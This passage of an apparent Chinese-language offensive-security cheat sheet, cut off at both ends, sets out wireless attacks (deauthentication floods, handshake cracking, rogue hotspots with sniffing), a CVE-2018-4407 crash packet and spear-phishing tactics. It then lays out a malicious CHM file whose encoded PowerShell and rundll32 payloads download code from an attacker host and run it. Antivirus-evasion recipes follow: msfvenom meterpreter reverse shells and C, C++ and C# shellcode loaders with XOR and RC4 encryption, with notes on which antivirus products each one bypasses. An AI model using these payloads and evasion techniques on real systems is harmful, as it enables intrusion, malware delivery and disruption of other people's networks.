2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon deauth攻击某个设备直至获取handshake(握手包)\n#airmon-ng stop wlan0mon  关闭监听模式\n#aircrack-ng –w wordlist.txt name.cap 指定字典破解密码\n</code></pre>\n<h3 id=\"钓鱼网络\"><a class=\"anchor\" href=\"#钓鱼网络\">#</a> 钓鱼网络</h3>\n<h2 id=\"-190\"><a class=\"anchor\" href=\"#-190\">#</a> </h2>\n<h2 id=\"hostapd\"><a class=\"anchor\" href=\"#hostapd\">#</a> Hostapd</h2>\n<pre><code>#apt install hostapd dnsmasq\n#cd /etc/hostapd\n#vim open.conf 创建无加密热点\nInterface=wlan1\nSsid=FreeWIFI\nDriver=nl80211\nChannel=1\nHw_mode=g\n\n#vim /etc/dnsmasq.conf\nDhcp-range=10.0.0.1, 10.0.0.255,12h\nInterface=wlan1\n\n#systemctl restart dnsmasq\n消除网卡限制\n#nmcli radio wifi off\n#rfkill unblock wlan\n#ifconfig wlan1 10.0.0.1/24\n#hostapd open.conf\n嗅探\n#sysctl –w net.ipv4.ip_forward=1\n#iptables –t nat –A POSTROUTING –o 网卡 –j MASQUERADE\n#bettercap –iface wlan1\n#net.show\n#net.sniff on\n#driftnet –i wlan1\n</code></pre>\n<h2 id=\"-191\"><a class=\"anchor\" href=\"#-191\">#</a> </h2>\n<h2 id=\"hostapd-wpe\"><a class=\"anchor\" href=\"#hostapd-wpe\">#</a> Hostapd-wpe</h2>\n<pre><code>#apt install hostapd-wpe\n#vim /etc/hostapd-wpe/hostapd-wpe.conf\n配置interface=wlan1\nSsid=\nChannel=\n证书修改\n#cd /etc/hostapd-wpe/certs/\n文件ca.cnf server.cnf client.cnf\n修改countrName stateOrProvinceName localityName …….\n#rm –rf *.pem *.der *.csr *.crt *.key *.p12 serial* index.txt*\n#make clean\n#./bootstrap\n#make install\n执行创建热点\n#hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n获取到密码时使用asleep破解\n#asleap –C Challenge值 –R response值 –W 字典文件\n</code></pre>\n<h3 id=\"无线干扰\"><a class=\"anchor\" href=\"#无线干扰\">#</a> 无线干扰</h3>\n<h2 id=\"-192\"><a class=\"anchor\" href=\"#-192\">#</a> </h2>\n<h2 id=\"beacon-flood\"><a class=\"anchor\" href=\"#beacon-flood\">#</a> Beacon flood</h2>\n<pre><code>需切换网卡为监听模式\n#airmon-ng start wlan1\n创建大量虚假热点Mdk3 mon0 b\n#mdk3 wlan1mon b -f /root/wifi.txt -a -s 1500\n</code></pre>\n<h2 id=\"-193\"><a class=\"anchor\" href=\"#-193\">#</a> </h2>\n<h2 id=\"deauth-flood\"><a class=\"anchor\" href=\"#deauth-flood\">#</a> Deauth flood</h2>\n<pre><code>针对AP\n#airmon-ng start wlan1\n#aireplay-ng –deauth 10 –a AP’s mac address mon0\n针对AP内设备\n#airmon-ng start wlan1       将网卡置为监听模式\n#airodump-ng wlan1mon –bssid 目标ap的ssid\n#aireplay-ng -0 0 -a ap的ssid -c AP的ssid wlan0mon 开始攻击\n</code></pre>\n<h2 id=\"-194\"><a class=\"anchor\" href=\"#-194\">#</a> </h2>\n<h2 id=\"mdk3-destruction\"><a class=\"anchor\" href=\"#mdk3-destruction\">#</a> Mdk3 destruction</h2>\n<pre><code>针对范围内\n#mdk3 wlan1mon d\n针对AP\n#airodump-ng wlan1mon\n#mdk3 wlan1mon a -a APmac 发起攻击\n黑名单\n#mdk3 wlan1mon d –c 信道 –b /blacklist.txt.\n#mdk3 wlan1mon  b -n test -w -g -c 1 -s 200\n</code></pre>\n<h2 id=\"-195\"><a class=\"anchor\" href=\"#-195\">#</a> </h2>\n<h2 id=\"wifi芯片esp8266\"><a class=\"anchor\" href=\"#wifi芯片esp8266\">#</a> WiFi 芯片 esp8266</h2>\n<h2 id=\"-196\"><a class=\"anchor\" href=\"#-196\">#</a> </h2>\n<h2 id=\"mdk4\"><a class=\"anchor\" href=\"#mdk4\">#</a> Mdk4</h2>\n<pre><code>#mdk4 wlan0mon d\n</code></pre>\n<h2 id=\"-197\"><a class=\"anchor\" href=\"#-197\">#</a> </h2>\n<h2 id=\"cve-2018-4407\"><a class=\"anchor\" href=\"#cve-2018-4407\">#</a> CVE-2018-4407</h2>\n<pre><code>Scapy\nsend(IP(dst=&quot;192.168.1.132&quot;,options=[IPOption(&quot;A&quot;*8)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))\nApple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）\nApple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）\nApple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）\nApple OS X El Capitan及更早版本：所有设备\n</code></pre>\n<h2 id=\"-198\"><a class=\"anchor\" href=\"#-198\">#</a> </h2>\n<h2 id=\"绕过mac地址认证\"><a class=\"anchor\" href=\"#绕过mac地址认证\">#</a> 绕过 mac 地址认证</h2>\n<h2 id=\"-199\"><a class=\"anchor\" href=\"#-199\">#</a> </h2>\n<h3 id=\"ifconfig\"><a class=\"anchor\" href=\"#ifconfig\">#</a> Ifconfig</h3>\n<pre><code>#ifconfig wlan1 down\n#ifconfig wlan1 hw ether xx:xx:xx:xx:xx:xx\n#ifconfig wlan1 up\n</code></pre>\n<h2 id=\"-200\"><a class=\"anchor\" href=\"#-200\">#</a> </h2>\n<h3 id=\"macchanger\"><a class=\"anchor\" href=\"#macchanger\">#</a> Macchanger</h3>\n<pre><code>#macchanger –m xx:xx:xx:xx:xx:xx wlan1\n#macchanger –r wlan1\n</code></pre>\n<h3 id=\"badusb\"><a class=\"anchor\" href=\"#badusb\">#</a> BadUSB</h3>\n<h3 id=\"克隆卡\"><a class=\"anchor\" href=\"#克隆卡\">#</a> 克隆卡</h3>\n<h3 id=\"蓝牙\"><a class=\"anchor\" href=\"#蓝牙\">#</a> 蓝牙</h3>\n<h2 id=\"鱼叉式攻击\"><a class=\"anchor\" href=\"#鱼叉式攻击\">#</a> 鱼叉式攻击</h2>\n<h3 id=\"钓鱼邮件\"><a class=\"anchor\" href=\"#钓鱼邮件\">#</a> 钓鱼邮件</h3>\n<pre><code>假冒的内部域名\n假冒的外部域名\n近似域名\n被黑账户\n群发/特定发\n虚构情景/恶意连接/恶意文件\n</code></pre>\n<h2 id=\"-201\"><a class=\"anchor\" href=\"#-201\">#</a> </h2>\n<h2 id=\"cve\"><a class=\"anchor\" href=\"#cve\">#</a> CVE</h2>\n<h2 id=\"-202\"><a class=\"anchor\" href=\"#-202\">#</a> </h2>\n<h3 id=\"cve-2017-11882\"><a class=\"anchor\" href=\"#cve-2017-11882\">#</a> CVE-2017-11882</h3>\n<pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016\n</code></pre>\n<h2 id=\"-203\"><a class=\"anchor\" href=\"#-203\">#</a> </h2>\n<h3 id=\"cve-2017-0199\"><a class=\"anchor\" href=\"#cve-2017-0199\">#</a> CVE-2017-0199</h3>\n<pre><code>Microsoft Office 2007 SP3 / 2010 SP2 / 2013 SP1 / 2016，Vista SP2，Server 2008 SP2，Windows 7 SP1，Windows 8.1\n</code></pre>\n<h2 id=\"-204\"><a class=\"anchor\" href=\"#-204\">#</a> </h2>\n<h3 id=\"cve-2012-0158\"><a class=\"anchor\" href=\"#cve-2012-0158\">#</a> CVE-2012-0158</h3>\n<pre><code>Microsoft Office 2003 SP3、2007 SP2和SP3，以及2010 Gold和SP1；Office 2003 Web组件SP3；SQL Server 2000 SP4、2005 SP4和2008 SP2，SP3和R2; BizTalk Server 2002 SP1；Commerce Server 2002 SP4、2007 SP2和2009 Gold和R2; Visual FoxPro 8.0 SP1和9.0 SP2; 和Visual Basic 6.0\n</code></pre>\n<h2 id=\"-205\"><a class=\"anchor\" href=\"#-205\">#</a> </h2>\n<h3 id=\"cve-2017-0143\"><a class=\"anchor\" href=\"#cve-2017-0143\">#</a> CVE-2017-0143</h3>\n<pre><code>Microsoft Windows Vista SP2；Windows Server 2008 SP2和R2 SP1; Windows 7 SP1；Windows 8.1; Windows Server 2012 Gold和R2；Windows RT 8.1；Windows 10 Gold，1511和1607；以及 和Windows Server 2016\nOFFICE文档/ PDF文件\n</code></pre>\n<h2 id=\"-206\"><a class=\"anchor\" href=\"#-206\">#</a> </h2>\n<h2 id=\"可执行文件\"><a class=\"anchor\" href=\"#可执行文件\">#</a> 可执行文件</h2>\n<h2 id=\"-207\"><a class=\"anchor\" href=\"#-207\">#</a> </h2>\n<h2 id=\"文档文件的伪造\"><a class=\"anchor\" href=\"#文档文件的伪造\">#</a> 文档文件的伪造</h2>\n<h2 id=\"-208\"><a class=\"anchor\" href=\"#-208\">#</a> </h2>\n<h2 id=\"扩展名图标\"><a class=\"anchor\" href=\"#扩展名图标\">#</a> 扩展名 / 图标</h2>\n<h2 id=\"-209\"><a class=\"anchor\" href=\"#-209\">#</a> </h2>\n<h2 id=\"捆绑\"><a class=\"anchor\" href=\"#捆绑\">#</a> 捆绑</h2>\n<h2 id=\"-210\"><a class=\"anchor\" href=\"#-210\">#</a> </h2>\n<h2 id=\"宏\"><a class=\"anchor\" href=\"#宏\">#</a> 宏</h2>\n<h2 id=\"-211\"><a class=\"anchor\" href=\"#-211\">#</a> </h2>\n<h2 id=\"0day\"><a class=\"anchor\" href=\"#0day\">#</a> 0day</h2>\n<h2 id=\"-212\"><a class=\"anchor\" href=\"#-212\">#</a> </h2>\n<h2 id=\"chm\"><a class=\"anchor\" href=\"#chm\">#</a> CHM</h2>\n<pre><code>使用编译的HTML文件加载恶意代码。\n使用EasyCHM对html进行编译，在html文件中插入恶意代码。\n使用MSF生成powershell格式的web_delivery模块\n使用Rundll32配合MyJSRAT实施运行无弹窗\n</code></pre>\n<p><img data-src=\"44.png\" alt=\"\" /></p>\n<pre><code>把命令base编码避免特殊符号\n</code></pre>\n<p><img data-src=\"45.png\" alt=\"\" /></p>\n<pre><code>执行语句编码后\n&gt;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==\n通过JSRat执行powershell上线命令\nhttps://github.com/Ridter/MyJSRat\n&gt;python MyJSRat.py -i 192.168.1.107 -p 8888 -c &quot;powershell -ep bypass -enc JABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAKACQAQgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAKACQAQgAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AAoASQBFAFgAIAAkAEIALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgAxADAANwA6ADgAMAA4ADAALwBQAEsAUQBOAEUAYgAnACkAOwAKAA==&quot;\n</code></pre>\n<p><img data-src=\"46.png\" alt=\"\" /></p>\n<pre><code>访问http://ip/wtf复制利用语句到html文件后编译\n</code></pre>\n<p><img data-src=\"47.png\" alt=\"\" /></p>\n<pre><code>&lt;PARAM name=&quot;Item1&quot; value=',rundll32.exe,javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;'&gt;\n</code></pre>\n<p><img data-src=\"48.png\" alt=\"\" /></p>\n<pre><code>正常打开CHM文件，无弹窗上线。\n</code></pre>\n<p><img data-src=\"49.png\" alt=\"\" /></p>\n<h3 id=\"钓鱼链接\"><a class=\"anchor\" href=\"#钓鱼链接\">#</a> 钓鱼链接</h3>\n<h2 id=\"-213\"><a class=\"anchor\" href=\"#-213\">#</a> </h2>\n<h2 id=\"url跳转\"><a class=\"anchor\" href=\"#url跳转\">#</a> URL 跳转</h2>\n<h2 id=\"-214\"><a class=\"anchor\" href=\"#-214\">#</a> </h2>\n<h2 id=\"结合恶意文档或程序\"><a class=\"anchor\" href=\"#结合恶意文档或程序\">#</a> 结合恶意文档或程序</h2>\n<h2 id=\"-215\"><a class=\"anchor\" href=\"#-215\">#</a> </h2>\n<h2 id=\"短url\"><a class=\"anchor\" href=\"#短url\">#</a> 短 URL</h2>\n<h2 id=\"-216\"><a class=\"anchor\" href=\"#-216\">#</a> </h2>\n<h2 id=\"结合水坑攻击\"><a class=\"anchor\" href=\"#结合水坑攻击\">#</a> 结合水坑攻击</h2>\n<h2 id=\"-217\"><a class=\"anchor\" href=\"#-217\">#</a> </h2>\n<h2 id=\"相似域名\"><a class=\"anchor\" href=\"#相似域名\">#</a> 相似域名</h2>\n<h2 id=\"-218\"><a class=\"anchor\" href=\"#-218\">#</a> </h2>\n<h2 id=\"域名窃取\"><a class=\"anchor\" href=\"#域名窃取\">#</a> 域名窃取</h2>\n<h3 id=\"第三方服务鱼叉\"><a class=\"anchor\" href=\"#第三方服务鱼叉\">#</a> 第三方服务鱼叉</h3>\n<pre><code>通过社交软件建立关系，如男女朋友，师父徒弟，HR，寻求业务等进行钓鱼攻击\n</code></pre>\n<h1 id=\"免杀\"><a class=\"anchor\" href=\"#免杀\">#</a> 免杀</h1>\n<h2 id=\"msf免杀\"><a class=\"anchor\" href=\"#msf免杀\">#</a> MSF 免杀</h2>\n<h3 id=\"nps_payload\"><a class=\"anchor\" href=\"#nps_payload\">#</a> nps_payload</h3>\n<pre><code>&gt;python nps_payload.py正常生成\n&gt;msfconsole -r msbuild_nps.rc开启监听\n&gt;%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe xx.xml\n&gt;wmiexec.py &lt;USER&gt;:'&lt;PASS&gt;'@&lt;RHOST&gt; cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\&lt;attackerip&gt;\\&lt;share&gt;\\msbuild_nps.xml\n正常执行结束进程msbuild会失去会话，以下保存bat执行\n获得session后立刻迁移进程\n@echo off\necho [*] Please Wait, preparing software ..\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\xxx.xml\nexit\n</code></pre>\n<h3 id=\"编码器\"><a class=\"anchor\" href=\"#编码器\">#</a> 编码器</h3>\n<pre><code>&gt;set EnableStageEncoding true\n&gt;set stageencoder x86/fnstenv_mov 编码进行免杀\n&gt;set stageencodingfallback false\n&amp;\n&gt;msfvenom --list encoders列出编码器\n</code></pre>\n<h3 id=\"cc源码免杀\"><a class=\"anchor\" href=\"#cc源码免杀\">#</a> c/c++ 源码免杀</h3>\n<pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f c -o 1.c\n-i编码20次\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n</code></pre>\n<h2 id=\"-219\"><a class=\"anchor\" href=\"#-219\">#</a> </h2>\n<h2 id=\"指针执行\"><a class=\"anchor\" href=\"#指针执行\">#</a> 指针执行</h2>\n<pre><code>unsigned char buf[] =\n&quot;shellcode&quot;;\n#pragma comment(linker,&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;) //windows控制台程序不出黑窗口\nmain()\n&#123;\n\t( (void(*)(void))&amp;buf)();\n&#125;\n使用vc6.0组建编译后在靶机执行\n</code></pre>\n<p><img data-src=\"50.png\" alt=\"\" /></p>\n<pre><code>当前过不了火绒，360动态静态可过\n</code></pre>\n<h2 id=\"-220\"><a class=\"anchor\" href=\"#-220\">#</a> </h2>\n<h2 id=\"申请动态内存\"><a class=\"anchor\" href=\"#申请动态内存\">#</a> 申请动态内存</h2>\n<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#pragma comment(linker,&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;) //windows控制台程序不出黑窗口\nunsigned char buf[] =\n&quot;shellcode&quot;;\nmain()\n&#123;\n\tchar *Memory;\n\tMemory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tmemcpy(Memory, buf, sizeof(buf));\n\t((void(*)())Memory)();\n&#125;\n</code></pre>\n<h2 id=\"-221\"><a class=\"anchor\" href=\"#-221\">#</a> </h2>\n<h2 id=\"嵌入汇编\"><a class=\"anchor\" href=\"#嵌入汇编\">#</a> 嵌入汇编</h2>\n<pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker, &quot;/section:.data,RWE&quot;)\nunsigned char shellcode[] =&quot;&quot;;\nvoid main()\n&#123;\n\t__asm\n\t&#123;\n\t\tmov eax, offset shellcode\n\t\tjmp eax\n\t&#125;\n&#125;\n</code></pre>\n<h2 id=\"-222\"><a class=\"anchor\" href=\"#-222\">#</a> </h2>\n<h2 id=\"强制类型转换\"><a class=\"anchor\" href=\"#强制类型转换\">#</a> 强制类型转换</h2>\n<pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\nunsigned char buf[] =&quot;&quot;;\nvoid main()\n&#123;\n ((void(WINAPI*)(void))&amp;buf)();\n&#125;\n</code></pre>\n<h2 id=\"-223\"><a class=\"anchor\" href=\"#-223\">#</a> </h2>\n<h2 id=\"汇编花指令\"><a class=\"anchor\" href=\"#汇编花指令\">#</a> 汇编花指令</h2>\n<pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker, &quot;/section:.data,RWE&quot;)\nunsigned char shellcode[] =&quot;&quot;;\nvoid main()\n&#123;\n\t\t__asm\n\t&#123;\n\t\tmov eax, offset shellcode\n\t\t_emit 0xFF  \n\t\t_emit 0xE0\n\t&#125;\n&#125;\n</code></pre>\n<h2 id=\"-224\"><a class=\"anchor\" href=\"#-224\">#</a> </h2>\n<h2 id=\"xor加密\"><a class=\"anchor\" href=\"#xor加密\">#</a> XOR 加密</h2>\n<pre><code>https://github.com/Arno0x/ShellcodeWrapper安装\n生成raw格式木马\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f raw -o shell.raw\n</code></pre>\n<p><img data-src=\"51.png\" alt=\"\" /></p>\n<pre><code>加密\n&gt; python shellcode_encoder.py -cpp -cs -py shell.raw thisiskey xor\n生成的py文件使用py2exe编译执行\n生成的cs文件使用csc.exe编译执行\n生成的cpp文件使用vc6.0编译，去掉预编译头编译执行\n</code></pre>\n<p><img data-src=\"52.png\" alt=\"\" /></p>\n<h2 id=\"-225\"><a class=\"anchor\" href=\"#-225\">#</a> </h2>\n<h2 id=\"远程线程注入\"><a class=\"anchor\" href=\"#远程线程注入\">#</a> 远程线程注入</h2>\n<pre><code>目前过火绒，不过360，可组合一下\nVs新建c++控制台程序\n右键属性-》将MFC的使用选为在静态库中使用MFC\n生成c格式shellcode粘贴进remote inject.cpp\n</code></pre>\n<p><img data-src=\"53.png\" alt=\"\" /></p>\n<pre><code>生成项目\n能成功上线，并开启calc进程\n</code></pre>\n<p><img data-src=\"54.png\" alt=\"\" /><br />\n<img data-src=\"55.png\" alt=\"\" /></p>\n<h2 id=\"-226\"><a class=\"anchor\" href=\"#-226\">#</a> </h2>\n<h2 id=\"加载器免杀\"><a class=\"anchor\" href=\"#加载器免杀\">#</a> 加载器免杀</h2>\n<h2 id=\"-227\"><a class=\"anchor\" href=\"#-227\">#</a> </h2>\n<h3 id=\"shellcode_launcher\"><a class=\"anchor\" href=\"#shellcode_launcher\">#</a> shellcode_launcher</h3>\n<pre><code>https://github.com/clinicallyinane/shellcode_launcher/\n生成payload(raw)\n&gt;msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.0.108 lport=12138 -f raw -o shellcode.raw\n加载器加载\n&gt;shellcode_launcher.exe -i shellcode.raw\n</code></pre>\n<h2 id=\"-228\"><a class=\"anchor\" href=\"#-228\">#</a> </h2>\n<h3 id=\"ssi加载\"><a class=\"anchor\" href=\"#ssi加载\">#</a> SSI 加载</h3>\n<pre><code>https://github.com/DimopoulosElias/SimpleShellcodeInjector\n生成payload(c)\n&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f c -o shellcode.c\n执行\n&gt;cat shellcode.c |grep -v unsigned|sed &quot;s/\\&quot;\\\\\\x//g&quot;|sed &quot;s/\\\\\\x//g&quot;|sed &quot;s/\\&quot;//g&quot;|sed ':a;N;$!ba;s/\\n//g'|sed &quot;s/;//g&quot;\n</code></pre>\n<p><img data-src=\"56.png\" alt=\"\" /></p>\n<pre><code>MSF监听\n可使用minGW自行编译\n&gt;gcc SimpleShellcodeInjector.c -o xxx.exe\n执行\n&gt;xxx.exe +生成的编码\n</code></pre>\n<h3 id=\"c源码免杀\"><a class=\"anchor\" href=\"#c源码免杀\">#</a> c# 源码免杀</h3>\n<h2 id=\"-229\"><a class=\"anchor\" href=\"#-229\">#</a> </h2>\n<h2 id=\"直接编译\"><a class=\"anchor\" href=\"#直接编译\">#</a> 直接编译</h2>\n<pre><code>生成payload\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt\nMSF启动监听\nPayload粘贴到位置\nusing System;\nusing System.Runtime.InteropServices;\nnamespace TCPMeterpreterProcess\n&#123;\n\tclass Program\n\t&#123;\n\t\tstatic void Main(string[] args)\n\t\t&#123;\n\t\t\tbyte[] shellcode = new byte[] &#123;payload here&#125;;\n\t\t\tUInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\t\t\tMarshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);\n\t\t\tIntPtr hThread = IntPtr.Zero;\n\t\t\tUInt32 threadId = 0;\n\t\t\t// prepare data\n\t\t\tIntPtr pinfo = IntPtr.Zero;\n\t\t\t// execute native code\n\t\t\thThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\t\t\tWaitForSingleObject(hThread, 0xFFFFFFFF);\n\t\t&#125;\n\t\tprivate static UInt32 MEM_COMMIT = 0x1000;\n\t\tprivate static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,\n\t\tUInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern bool VirtualFree(IntPtr lpAddress,\n\t\tUInt32 dwSize, UInt32 dwFreeType);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern IntPtr CreateThread(\n\t\t\tUInt32 lpThreadAttributes,\n\t\t\tUInt32 dwStackSize,\n\t\t\tUInt32 lpStartAddress,\n\t\t\tIntPtr param,\n\t\t\tUInt32 dwCreationFlags,\n\t\t\tref UInt32 lpThreadId\n\t\t);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern bool CloseHandle(IntPtr handle);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern UInt32 WaitForSingleObject(\n\t\t\tIntPtr hHandle,\n\t\t\tUInt32 dwMilliseconds\n\t\t);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern IntPtr GetModuleHandle(\n\t\t\tstring moduleName\n\t\t);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern UInt32 GetProcAddress(\n\t\t\tIntPtr hModule,\n\t\t\tstring procName\n\t\t);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern UInt32 LoadLibrary(\n\t\t\tstring lpFileName\n\t\t);\n\t\t[DllImport(&quot;kernel32&quot;)]\n\t\tprivate static extern UInt32 GetLastError();\n\t&#125;\n&#125;\nVisual studio创建C#.net framework控制台程序编译可过杀软\n</code></pre>\n<h2 id=\"-230\"><a class=\"anchor\" href=\"#-230\">#</a> </h2>\n<h2 id=\"加密处理\"><a class=\"anchor\" href=\"#加密处理\">#</a> 加密处理</h2>\n<pre><code>生成payload\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt\n粘贴payload后编译加密\nusing System;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Linq;\nusing System.Security.Cryptography;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System.Reflection;\nusing System.Runtime.CompilerServices;\nusing System.Runtime.InteropServices;\nnamespace Payload_Encrypt_Maker\n&#123;\n\tclass Program\n\t&#123;\n\t\t// 加密密钥，可以更改，加解密源码中保持KEY一致就行\n\t\tstatic byte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;\n\t\tstatic byte[] IV = &#123; 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc &#125;;\n\t\tstatic byte[] payload = &#123; payload here &#125;;    // 替换成MSF生成的shellcode\n\t\tprivate static class Encryption_Class\n\t\t&#123;\n\t\t\tpublic static string Encrypt(string key, string data)\n\t\t\t&#123;\n\t\t\t\tEncoding unicode = Encoding.Unicode;\n\t\t\t\treturn Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));\n\t\t\t&#125;\n\t\t\tpublic static byte[] Encrypt(byte[] key, byte[] data)\n\t\t\t&#123;\n\t\t\t\treturn EncryptOutput(key, data).ToArray();\n\t\t\t&#125;\n\t\t\tprivate static byte[] EncryptInitalize(byte[] key)\n\t\t\t&#123;\n\t\t\t\tbyte[] s = Enumerable.Range(0, 256)\n\t\t\t\t.Select(i =&gt; (byte)i)\n\t\t\t\t.ToArray();\n\t\t\t\tfor (int i = 0, j = 0; i &lt; 256; i++)\n\t\t\t\t&#123;\n\t\t\t\t\tj = (j + key[i % key.Length] + s[i]) &amp; 255;\n\t\t\t\t\tSwap(s, i, j);\n\t\t\t\t&#125;\n\t\t\t\treturn s;\n\t\t\t&#125;\n\t\t\tprivate static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\t\t\t&#123;\n\t\t\t\tbyte[] s = EncryptInitalize(key);\n\t\t\t\tint i = 0;\n\t\t\t\tint j = 0;\n\t\t\t\treturn data.Select((b) =&gt;\n\t\t\t\t&#123;\n\t\t\t\t\ti = (i + 1) &amp; 255;\n\t\t\t\t\tj = (j + s[i]) &amp; 255;\n\t\t\t\t\tSwap(s, i, j);\n\t\t\t\t\treturn (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\t\t\t\t&#125;);\n\t\t\t&#125;\n\t\t\tprivate static void Swap(byte[] s, int i, int j)\n\t\t\t&#123;\n\t\t\t\tbyte c = s[i];\n\t\t\t\ts[i] = s[j];\n\t\t\t\ts[j] = c;\n\t\t\t&#125;\n\t\t&#125;\n\t\tstatic void Main(string[] args)\n\t\t&#123;\n\t\t\tbyte[] result = Encryption_Class.Encrypt(KEY, payload);\n\t\t\tint b = 0;\n\t\t\tfor (int i = 0; i &lt; result.Length; i++)\n\t\t\t&#123;\n\t\t\t\tb++;\n\t\t\t\tif (i == result.Length + 1)\n\t\t\t\t&#123; Console.Write(result[i].ToString()); &#125;\n\t\t\t\tif (i != result.Length) &#123; Console.Write(result[i].ToString() + &quot;,&quot;); &#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n&#125;\n</code></pre>\n<p><img data-src=\"57.png\" alt=\"\" 